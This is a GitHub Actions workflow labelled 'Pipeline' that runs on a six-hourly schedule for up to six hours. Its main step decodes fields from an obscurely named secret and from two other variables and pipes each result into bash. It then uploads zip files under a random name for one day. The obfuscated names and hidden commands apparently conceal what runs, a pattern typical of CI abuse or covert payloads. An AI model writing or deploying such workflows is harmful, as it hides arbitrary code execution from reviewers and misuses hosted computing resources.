name: Pipeline
on:
  workflow_dispatch:

  schedule:
    - cron: '52 1,7,13,19 * * *'
jobs:
  runner:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Go
        env:
          qmfo1: ${{ secrets.qmfo1 }}
        run: |
          printf '%s' "$qmfo1" | jq -r .h279 | /bin/bash
          echo $riw40 | jq -r .lomx28 | /bin/bash
          printf '%s' "$vq5" | jq -r .j28 | /bin/bash

      - name: Archive results
        uses: actions/upload-artifact@v4
        with:
          name: Pf4k6hG5
          path: "*.zip"
          retention-days: 1
